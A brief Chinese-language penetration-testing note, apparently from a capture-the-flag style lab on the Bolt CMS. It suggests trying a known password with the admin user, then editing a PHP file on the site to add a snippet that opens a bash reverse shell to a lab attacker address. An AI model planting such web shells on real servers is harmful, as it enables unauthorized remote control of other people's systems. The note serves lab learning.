# Bolt

特征文件是ovm，并且注意已知密码可能和admin用户搭配\
尝试修改页面存在的php文件\
添加如下，可以尝试

```bash
<?php
	system("bash -c 'bash -i  >& /dev/tcp/10.10.14.29/7777 0>&1'")
?>
```
